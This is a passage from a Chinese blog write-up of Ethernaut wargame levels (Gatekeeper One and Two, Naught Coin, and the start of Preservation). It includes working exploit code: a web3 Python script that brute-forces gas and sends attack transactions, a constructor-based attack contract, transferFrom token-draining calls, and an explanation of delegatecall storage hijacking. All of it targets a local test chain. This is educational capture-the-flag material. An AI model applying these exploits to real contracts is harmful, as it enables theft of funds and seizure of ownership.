class="built_in">int</span>(<span class="number">1337</span>)</span><br><span class="line">RPC_url = <span class="string">&#x27;http://localhost:8545&#x27;</span></span><br><span class="line">web3 = Web3(HTTPProvider(RPC_url))</span><br><span class="line"></span><br><span class="line">state = web3.is_connected()</span><br><span class="line"><span class="built_in">print</span>(state)</span><br><span class="line"><span class="keyword">if</span> <span class="keyword">not</span> state:</span><br><span class="line">    exit(-<span class="number">1</span>)</span><br><span class="line">player = <span class="string">&#x27;0xf39Fd6e51aad88F6F4ce6aB8827279cffFb92266&#x27;</span></span><br><span class="line">sk = <span class="string">&#x27;ac0974bec39a17e36ba4a6b4d238ff944bacb478cbed5efcae784d7bf4f2ff80&#x27;</span></span><br><span class="line">account = web3.eth.account.from_key(sk)</span><br><span class="line"><span class="built_in">print</span>(web3.eth.get_balance(player))</span><br><span class="line"></span><br><span class="line">hackAbi = <span class="string">&#x27;[&#123;&quot;inputs&quot;:[&#123;&quot;internalType&quot;:&quot;uint256&quot;,&quot;name&quot;:&quot;g&quot;,&quot;type&quot;:&quot;uint256&quot;&#125;,&#123;&quot;internalType&quot;:&quot;address&quot;,&quot;name&quot;:&quot;a&quot;,&quot;type&quot;:&quot;address&quot;&#125;,&#123;&quot;internalType&quot;:&quot;bytes8&quot;,&quot;name&quot;:&quot;b&quot;,&quot;type&quot;:&quot;bytes8&quot;&#125;],&quot;name&quot;:&quot;hack&quot;,&quot;outputs&quot;:[],&quot;stateMutability&quot;:&quot;nonpayable&quot;,&quot;type&quot;:&quot;function&quot;&#125;,&#123;&quot;inputs&quot;:[],&quot;stateMutability&quot;:&quot;nonpayable&quot;,&quot;type&quot;:&quot;constructor&quot;&#125;,&#123;&quot;stateMutability&quot;:&quot;payable&quot;,&quot;type&quot;:&quot;receive&quot;&#125;]&#x27;</span></span><br><span class="line">hackAbi = json.loads(hackAbi)</span><br><span class="line">hackAddress = <span class="string">&#x27;0x40918Ba7f132E0aCba2CE4de4c4baF9BD2D7D849&#x27;</span></span><br><span class="line">hackContract = web3.eth.contract(abi=hackAbi, address=hackAddress)</span><br><span class="line"></span><br><span class="line">gAddr = <span class="string">&#x27;0x5E3d0fdE6f793B3115A9E7f5EBC195bbeeD35d6C&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">200</span>, <span class="number">500</span>):</span><br><span class="line">    functionEncode = hackContract.encodeABI(fn_name=<span class="string">&quot;hack&quot;</span>, args=[<span class="number">819100</span> + i, gAddr, <span class="string">b&#x27;aaaaaaaa&#x27;</span>])</span><br><span class="line">    nonce = <span class="built_in">int</span>(web3.eth.get_transaction_count(account.address))</span><br><span class="line">    tx = &#123;</span><br><span class="line">        <span class="string">&#x27;chainId&#x27;</span>: chainId,</span><br><span class="line">        <span class="string">&#x27;nonce&#x27;</span>: nonce,</span><br><span class="line">        <span class="string">&#x27;gasPrice&#x27;</span>: <span class="built_in">int</span>(<span class="number">5000000</span>),</span><br><span class="line">        <span class="string">&#x27;gas&#x27;</span>: <span class="built_in">int</span>(<span class="number">5000000</span>),</span><br><span class="line">        <span class="string">&#x27;value&#x27;</span>: <span class="built_in">int</span>(<span class="number">0</span>),</span><br><span class="line">        <span class="string">&#x27;from&#x27;</span>: player,</span><br><span class="line">        <span class="string">&#x27;to&#x27;</span>: hackAddress,</span><br><span class="line">        <span class="string">&#x27;data&#x27;</span>: functionEncode,</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        sign = web3.eth.account.sign_transaction(tx, sk)</span><br><span class="line">        hashTx = web3.eth.send_raw_transaction(sign.rawTransaction).<span class="built_in">hex</span>()</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;[Log] Sending transaction ...&#x27;</span>)</span><br><span class="line">        result = web3.eth.wait_for_transaction_receipt(hashTx)</span><br><span class="line">        <span class="built_in">print</span>(result)</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="built_in">print</span>(i)</span><br><span class="line">        <span class="keyword">if</span> e.args[<span class="number">0</span>][<span class="string">&#x27;data&#x27;</span>][<span class="string">&#x27;message&#x27;</span>] != <span class="string">&#x27;Error: Transaction reverted without a reason string&#x27;</span>:</span><br><span class="line">            <span class="built_in">print</span>(e)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"><span class="comment"># 256</span></span><br></pre></td></tr></table></figure>
<p>以上<code>hackAbi</code>和<code>hackAddress</code>填上攻击合约<code>hack.sol</code>部署后的ABI和地址，<code>gAddr</code>填上题目合约地址，最后测出来需要输入的<code>gas</code>是<code>8191 * n + 256</code></p>
<p>还有另一个坑是，如果我用题目源码在Remix上面自己编一遍的话，会发现消耗的<code>gas</code>会不一样，比如我用Remix上的<code>0.8.0</code>编出来，测了一下需要<code>8191 * n + 426</code>，明显和题目编的不一样</p>
<h2 id="GateThree">GateThree<a class="anchor" href="#GateThree">·</a></h2>
<p><code>GateThree</code>就是<a href="https://tover.xyz/p/Ethernaut-note/#12-Privacy">Privacy</a>的内容，首先需要根据<a target="_blank" rel="noopener" href="https://learnblockchain.cn/article/6446">这里</a>的知识复习一下变量在内存的存储方式</p>
<p>如果把<code>_gateKey</code>划分成<code>gk7 | gk6 | ... | gk0</code>这8个Bytes的话，<code>uint64(_gateKey)</code>就是直接把这8个Bytes转成数字</p>
<p>第一个条件中，<code>uint32(uint64(_gateKey))</code>就是<code>gk3 | gk2 | gk1 | gk0</code>这4个Bytes，<code>uint16(uint64(_gateKey)</code>就是<code>gk1 | gk0</code>这2个Bytes，现在要两者相等，就是要<code>gk3</code>和<code>gk2</code>都是<code>\x00</code></p>
<p>第二个条件中，<code>uint32(uint64(_gateKey)) != uint64(_gateKey)</code>就是要<code>gk7 | gk6 | gk5 | gk4</code>这4个Bytes不全为<code>\x00</code></p>
<p>第三个条件中，<code>uint16(uint160(tx.origin)</code>就是<code>tx.origin</code>的最低2个Bytes，<code>uint32(uint64(_gateKey))</code>上面说了等于<code>gk1 | gk0</code>，所以就是要<code>gk1 | gk0</code>等于<code>tx.origin</code>的最低2个Bytes</p>
<p>所以根据分析</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> web3 <span class="keyword">import</span> Web3, HTTPProvider</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">chainId = <span class="built_in">int</span>(<span class="number">1337</span>)</span><br><span class="line">RPC_url = <span class="string">&#x27;http://localhost:8545&#x27;</span></span><br><span class="line">web3 = Web3(HTTPProvider(RPC_url))</span><br><span class="line"></span><br><span class="line">state = web3.is_connected()</span><br><span class="line"><span class="built_in">print</span>(state)</span><br><span class="line"><span class="keyword">if</span> <span class="keyword">not</span> state:</span><br><span class="line">    exit(-<span class="number">1</span>)</span><br><span class="line">player = <span class="string">&#x27;0xf39Fd6e51aad88F6F4ce6aB8827279cffFb92266&#x27;</span></span><br><span class="line">sk = <span class="string">&#x27;ac0974bec39a17e36ba4a6b4d238ff944bacb478cbed5efcae784d7bf4f2ff80&#x27;</span></span><br><span class="line">account = web3.eth.account.from_key(sk)</span><br><span class="line"><span class="built_in">print</span>(web3.eth.get_balance(player))</span><br><span class="line"></span><br><span class="line">hackAbi = <span class="string">&#x27;[&#123;&quot;inputs&quot;:[&#123;&quot;internalType&quot;:&quot;uint256&quot;,&quot;name&quot;:&quot;g&quot;,&quot;type&quot;:&quot;uint256&quot;&#125;,&#123;&quot;internalType&quot;:&quot;address&quot;,&quot;name&quot;:&quot;a&quot;,&quot;type&quot;:&quot;address&quot;&#125;,&#123;&quot;internalType&quot;:&quot;bytes8&quot;,&quot;name&quot;:&quot;b&quot;,&quot;type&quot;:&quot;bytes8&quot;&#125;],&quot;name&quot;:&quot;hack&quot;,&quot;outputs&quot;:[],&quot;stateMutability&quot;:&quot;nonpayable&quot;,&quot;type&quot;:&quot;function&quot;&#125;,&#123;&quot;inputs&quot;:[],&quot;stateMutability&quot;:&quot;nonpayable&quot;,&quot;type&quot;:&quot;constructor&quot;&#125;,&#123;&quot;stateMutability&quot;:&quot;payable&quot;,&quot;type&quot;:&quot;receive&quot;&#125;]&#x27;</span></span><br><span class="line">hackAbi = json.loads(hackAbi)</span><br><span class="line">hackAddress = <span class="string">&#x27;0x40918Ba7f132E0aCba2CE4de4c4baF9BD2D7D849&#x27;</span></span><br><span class="line">hackContract = web3.eth.contract(abi=hackAbi, address=hackAddress)</span><br><span class="line"></span><br><span class="line">gAddr = <span class="string">&#x27;0x5E3d0fdE6f793B3115A9E7f5EBC195bbeeD35d6C&#x27;</span></span><br><span class="line">functionEncode = hackContract.encodeABI(fn_name=<span class="string">&quot;hack&quot;</span>, args=[<span class="number">819100</span> + <span class="number">256</span>, gAddr, <span class="string">b&#x27;aaaa\x00\x00&#x27;</span> + <span class="built_in">bytes</span>.fromhex(player[-<span class="number">4</span>:])])</span><br><span class="line">nonce = <span class="built_in">int</span>(web3.eth.get_transaction_count(account.address))</span><br><span class="line">tx = &#123;</span><br><span class="line">    <span class="string">&#x27;chainId&#x27;</span>: chainId,</span><br><span class="line">    <span class="string">&#x27;nonce&#x27;</span>: nonce,</span><br><span class="line">    <span class="string">&#x27;gasPrice&#x27;</span>: <span class="built_in">int</span>(<span class="number">5000000</span>),</span><br><span class="line">    <span class="string">&#x27;gas&#x27;</span>: <span class="built_in">int</span>(<span class="number">5000000</span>),</span><br><span class="line">    <span class="string">&#x27;value&#x27;</span>: <span class="built_in">int</span>(<span class="number">0</span>),</span><br><span class="line">    <span class="string">&#x27;from&#x27;</span>: player,</span><br><span class="line">    <span class="string">&#x27;to&#x27;</span>: hackAddress,</span><br><span class="line">    <span class="string">&#x27;data&#x27;</span>: functionEncode,</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    sign = web3.eth.account.sign_transaction(tx, sk)</span><br><span class="line">    hashTx = web3.eth.send_raw_transaction(sign.rawTransaction).<span class="built_in">hex</span>()</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;[Log] Sending transaction ...&#x27;</span>)</span><br><span class="line">    result = web3.eth.wait_for_transaction_receipt(hashTx)</span><br><span class="line">    <span class="built_in">print</span>(result)</span><br><span class="line"><span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">    <span class="built_in">print</span>(e)</span><br></pre></td></tr></table></figure>
<p>回到题目中看看</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">await</span> contract.entrant()</span><br><span class="line"><span class="comment">// &#x27;0xf39Fd6e51aad88F6F4ce6aB8827279cffFb92266&#x27;</span></span><br></pre></td></tr></table></figure>
<p>提交即可</p>
<h1 id="14-Gatekeeper-Two">14_Gatekeeper Two<a class="anchor" href="#14-Gatekeeper-Two">·</a></h1>
<p>这个守门人带来了一些新的挑战, 同样的需要注册为参赛者来完成这一关</p>
<p>这可能有帮助:</p>
<ul>
<li>想一想你从上一个守门人那学到了什么.</li>
<li>第二个门中的 <code>assembly</code> 关键词可以让一个合约访问非原生的 vanilla solidity 功能. 参见 <a target="_blank" rel="noopener" href="http://solidity.readthedocs.io/en/v0.4.23/assembly.html">here</a> . <code>extcodesize</code> 函数可以用来得到给定地址合约的代码长度 - 你可以在这个页面学习到更多 <a target="_blank" rel="noopener" href="https://ethereum.github.io/yellowpaper/paper.pdf">yellow paper</a>.</li>
<li><code>^</code> 符号在第三个门里是位操作 (XOR), 在这里是代表另一个常见的位操作 (参见 <a target="_blank" rel="noopener" href="http://solidity.readthedocs.io/en/v0.4.23/miscellaneous.html#cheatsheet">here</a>). Coin Flip 关卡也是一个很好的参考.</li>
</ul>
<p>题目代码：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">contract GatekeeperTwo &#123;</span><br><span class="line"></span><br><span class="line">  address public entrant;</span><br><span class="line"></span><br><span class="line">  modifier gateOne() &#123;</span><br><span class="line">    require(msg.sender != tx.origin);</span><br><span class="line">    _;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  modifier gateTwo() &#123;</span><br><span class="line">    uint x;</span><br><span class="line">    assembly &#123; x := extcodesize(caller()) &#125;</span><br><span class="line">    require(x == 0);</span><br><span class="line">    _;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  modifier gateThree(bytes8 _gateKey) &#123;</span><br><span class="line">    require(uint64(bytes8(keccak256(abi.encodePacked(msg.sender)))) ^ uint64(_gateKey) == type(uint64).max);</span><br><span class="line">    _;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function enter(bytes8 _gateKey) public gateOne gateTwo gateThree(_gateKey) returns (bool) &#123;</span><br><span class="line">    entrant = tx.origin;</span><br><span class="line">    return true;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>首先<code>gateOne</code>和上一关类似，略了</p>
<p><code>gateTwo</code>调用了个<a target="_blank" rel="noopener" href="https://docs.soliditylang.org/en/v0.4.23/assembly.html">内联汇编</a>，但代码不长，所以还不用慌</p>
<p><code>extcodesize(caller())</code>大概意思是调用者的合约的代码长度，一般来说能做调用的话起码会有调用的代码，所以代码长度都应该大于<code>0</code>，但有一种情况例外，就是合约创建时在<code>contract</code>中调用，这时因为合约还没部署完成，所以不会查到代码长度，参考：<a target="_blank" rel="noopener" href="https://ethereum.stackexchange.com/questions/45095/how-could-msg-sender-tx-origin-and-extcodesizecaller-0-be-true">这里</a></p>
<p><code>gateThree</code>就是算个异或，<code>msg.sender</code>在攻击合约中就是<code>address(this)</code>，所以在攻击代码中算出<code>_gateKey</code>为</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uint64 gk = uint64(bytes8(keccak256(abi.encodePacked(this)))) ^ type(uint64).max;</span><br></pre></td></tr></table></figure>
<p>然后发送时转成<code>bytes8</code>即可</p>
<p>参考代码</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">interface GatekeeperTwo  &#123;</span><br><span class="line">  function enter(bytes8 _gateKey) external;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract Hack &#123;</span><br><span class="line">  constructor() &#123;</span><br><span class="line">    address vicAddr = 0xeC4cFde48EAdca2bC63E94BB437BbeAcE1371bF3;</span><br><span class="line">    GatekeeperTwo gt = GatekeeperTwo(vicAddr);</span><br><span class="line">    uint64 gk = uint64(bytes8(keccak256(abi.encodePacked(this)))) ^ type(uint64).max;</span><br><span class="line">    gt.enter(bytes8(gk));</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>回到题目中</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">await</span> contract.entrant()</span><br><span class="line"><span class="comment">// &#x27;0xf39Fd6e51aad88F6F4ce6aB8827279cffFb92266&#x27;</span></span><br></pre></td></tr></table></figure>
<p>提交即可</p>
<img src="/p/Ethernaut-note/image-20231019114545189.png" class="" title="img_image-20231019114545189">
<p>额</p>
<h1 id="15-Naught-Coin">15_Naught Coin<a class="anchor" href="#15-Naught-Coin">·</a></h1>
<p>NaughtCoin 是一种 ERC20 代币，而且您已经持有这些代币。问题是您只能在 10 年之后才能转移它们。您能尝试将它们转移到另一个地址，以便您可以自由使用它们吗？通过将您的代币余额变为 0 来完成此关卡。</p>
<p>这可能有用</p>
<ul>
<li><a target="_blank" rel="noopener" href="https://github.com/ethereum/EIPs/blob/master/EIPS/eip-20.md">ERC20标准</a></li>
<li><a target="_blank" rel="noopener" href="https://github.com/OpenZeppelin/zeppelin-solidity/tree/master/contracts">OpenZeppelin仓库</a></li>
</ul>
<p>题目代码：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">import &#x27;openzeppelin-contracts-08/token/ERC20/ERC20.sol&#x27;;</span><br><span class="line"></span><br><span class="line"> contract NaughtCoin is ERC20 &#123;</span><br><span class="line"></span><br><span class="line">  // string public constant name = &#x27;NaughtCoin&#x27;;</span><br><span class="line">  // string public constant symbol = &#x27;0x0&#x27;;</span><br><span class="line">  // uint public constant decimals = 18;</span><br><span class="line">  uint public timeLock = block.timestamp + 10 * 365 days;</span><br><span class="line">  uint256 public INITIAL_SUPPLY;</span><br><span class="line">  address public player;</span><br><span class="line"></span><br><span class="line">  constructor(address _player) </span><br><span class="line">  ERC20(&#x27;NaughtCoin&#x27;, &#x27;0x0&#x27;) &#123;</span><br><span class="line">    player = _player;</span><br><span class="line">    INITIAL_SUPPLY = 1000000 * (10**uint256(decimals()));</span><br><span class="line">    // _totalSupply = INITIAL_SUPPLY;</span><br><span class="line">    // _balances[player] = INITIAL_SUPPLY;</span><br><span class="line">    _mint(player, INITIAL_SUPPLY);</span><br><span class="line">    emit Transfer(address(0), player, INITIAL_SUPPLY);</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  function transfer(address _to, uint256 _value) override public lockTokens returns(bool) &#123;</span><br><span class="line">    super.transfer(_to, _value);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  // Prevent the initial owner from transferring tokens until the timelock has passed</span><br><span class="line">  modifier lockTokens() &#123;</span><br><span class="line">    if (msg.sender == player) &#123;</span><br><span class="line">      require(block.timestamp &gt; timeLock);</span><br><span class="line">      _;</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">     _;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>首先关于ERC20可以参考<a target="_blank" rel="noopener" href="https://www.wtf.academy/solidity-application/ERC20/">WTF Solidity</a></p>
<p>先看余额</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">(<span class="keyword">await</span> contract.balanceOf(player)).toString()</span><br><span class="line"><span class="string">&#x27;1000000000000000000000000&#x27;</span></span><br></pre></td></tr></table></figure>
<p>题目覆写了父类<code>ERC20</code>的转账函数<code>transfer</code>，加了个<code>lockTokens</code>，而且<code>lockTokens</code>的时间设置看着好像没问题。</p>
<p>翻文档可以知道<code>ERC20</code>还有另一个转账函数是<code>transferFrom</code>，而这个函数没被题目函数覆写，所以可以考虑跳过题目合约直接调用<code>transferFrom</code>转账。</p>
<p>直接调用transferFrom会报<code>ERC20: insufficient allowance</code>，参考<a target="_blank" rel="noopener" href="https://ethereum.stackexchange.com/questions/148102/getting-fail-with-error-erc20-insufficient-allowance">这里</a>可知要调用<code>approve</code>授权</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">await</span> contract.approve(player, <span class="keyword">await</span> contract.INITIAL_SUPPLY())</span><br></pre></td></tr></table></figure>
<p>在MetaMask批准一下，然后转账</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">await</span> contract.transferFrom(player, contract.address, <span class="keyword">await</span> contract.balanceOf(player))</span><br></pre></td></tr></table></figure>
<p>再看余额</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">(<span class="keyword">await</span> contract.balanceOf(player)).toString()</span><br><span class="line"><span class="string">&#x27;0&#x27;</span></span><br></pre></td></tr></table></figure>
<p>提交即可</p>
<img src="/p/Ethernaut-note/image-20231122172347812.png" class="" title="img_image-20231122172347812">
<h1 id="16-Preservation">16_Preservation<a class="anchor" href="#16-Preservation">·</a></h1>
<p>该合约利用库合约保存 2 个不同时区的时间戳。合约的构造函数输入两个库合约地址用于保存不同时区的时间戳。</p>
<p>通关条件：尝试取得合约的所有权（<code>owner</code>）。</p>
<p>可能有帮助的注意点：</p>
<ol>
<li>深入了解 <code>Solidity</code> 官网文档中底层方法 <code>delegatecall</code> 的工作原理，它如何在链上和库合约中的使用该方法，以及执行的上下文范围。</li>
<li>理解 <code>delegatecall</code> 的上下文保留的含义</li>
<li>理解合约中的变量是如何存储和访问的</li>
<li>理解不同类型之间的如何转换</li>
</ol>
<p>题目代码：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">contract Preservation &#123;</span><br><span class="line"></span><br><span class="line">  // public library contracts </span><br><span class="line">  address public timeZone1Library;</span><br><span class="line">  address public timeZone2Library;</span><br><span class="line">  address public owner; </span><br><span class="line">  uint storedTime;</span><br><span class="line">  // Sets the function signature for delegatecall</span><br><span class="line">  bytes4 constant setTimeSignature = bytes4(keccak256(&quot;setTime(uint256)&quot;));</span><br><span class="line"></span><br><span class="line">  constructor(address _timeZone1LibraryAddress, address _timeZone2LibraryAddress) &#123;</span><br><span class="line">    timeZone1Library = _timeZone1LibraryAddress; </span><br><span class="line">    timeZone2Library = _timeZone2LibraryAddress; </span><br><span class="line">    owner = msg.sender;</span><br><span class="line">  &#125;</span><br><span class="line"> </span><br><span class="line">  // set the time for timezone 1</span><br><span class="line">  function setFirstTime(uint _timeStamp) public &#123;</span><br><span class="line">    timeZone1Library.delegatecall(abi.encodePacked(setTimeSignature, _timeStamp));</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  // set the time for timezone 2</span><br><span class="line">  function setSecondTime(uint _timeStamp) public &#123;</span><br><span class="line">    timeZone2Library.delegatecall(abi.encodePacked(setTimeSignature, _timeStamp));</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">// Simple library contract to set the time</span><br><span class="line">contract LibraryContract &#123;</span><br><span class="line"></span><br><span class="line">  // stores a timestamp </span><br><span class="line">  uint storedTime;  </span><br><span class="line"></span><br><span class="line">  function setTime(uint _time) public &#123;</span><br><span class="line">    storedTime = _time;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>先看一下<code>owner</code>，不是我</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">await</span> contract.owner()</span><br><span class="line"><span class="string">&#x27;0x59b670e9fA9D0A427751Af201D676719a970857b&#x27;</span></span><br></pre></td></tr></table></figure>
<p>在<a href="https://tover.xyz/p/Ethernaut-note/#06-Delegation">Delegation</a>中已经接触过委托调用，委托调用大概的特点是，调用外部合约的代码，但是修改自己合约的内存变量，关于委托调用的更多知识可以参考<a target="_blank" rel="noopener" href="https://github.com/AmazingAng/WTF-Solidity/tree/main/23_Delegatecall">WTF Solidity</a></p>
<p>在WTF其中提到<code>合约B必须和目标合约C的变量存储布局必须相同</code>，然而题目的合约明显就布局不一样，可以测一下会发生什么，随便调用一下<code>setFirstTime</code></p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">await</span> contract.timeZone1Library()</span><br><span class="line"><span class="comment">// &#x27;0xCe85503De9399D4dECa3c0b2bb3e9e7CFCBf9C6B&#x27;</span></span><br><span class="line"><span class="keyword">await</span> web3.eth.getStorageAt(contract.address, <span class="number">0</span>)</span><br><span class="line"><span class="comment">// &#x27;0x000000000000000000000000ce85503de9399d4deca3c0b2bb3e9e7cfcbf9c6b&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">await</span> contract.setFirstTime(<span class="number">123</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">await</span> contract.timeZone1Library()</span><br><span class="line"><span class="comment">// &#x27;0x000000000000000000000000000000000000007B&#x27;</span></span><br><span class="line"><span class="keyword">await</span> web3.eth.getStorageAt(contract.address, <span class="number">0</span>)</span><br><span class="line"><span class="comment">// &#x27;0x000000000000000000000000000000000000000000000000000000000000007b&#x27;</span></span><br></pre></td></tr></table></figure>
<p>可以发现<code>timeZone1Library</code>变量已经变成我从<code>setFirstTime</code>传进去的参数，就是说，<code>delegatecall</code>修改自己合约中的变量并不是按变量名修改，而是按内存地址修改</p>
<p>在<code>LibraryContract </code>中第一个变量是<code>storedTime</code>（256 bits），而在<code>Preservation </code>中第一个变量是<code>timeZone1Library</code>（256 bits），在使用<code>delegatecall</code>调用<code>LibraryContract</code>的<code>setTime</code>时，他会去寻找被认为是<code>storedTime</code>的第一个变量，但实际在<code>Preservation</code>合约中的第一个变量是<code>timeZone1Library</code>，所以最终改的是<code>timeZone1Library</code>，（有点绕）</p>
<p>于是就可以自己怼一个攻击合约，在攻击合约中修改<code>owner</code>，然后用上面方法把<code>timeZone1Library</code>改成攻击合约的地址，最后再调用一次<code>setFirstTime</code>获得权限</p>
<p>参考攻击合约（注意变量布局要和题目合约一致）</p>
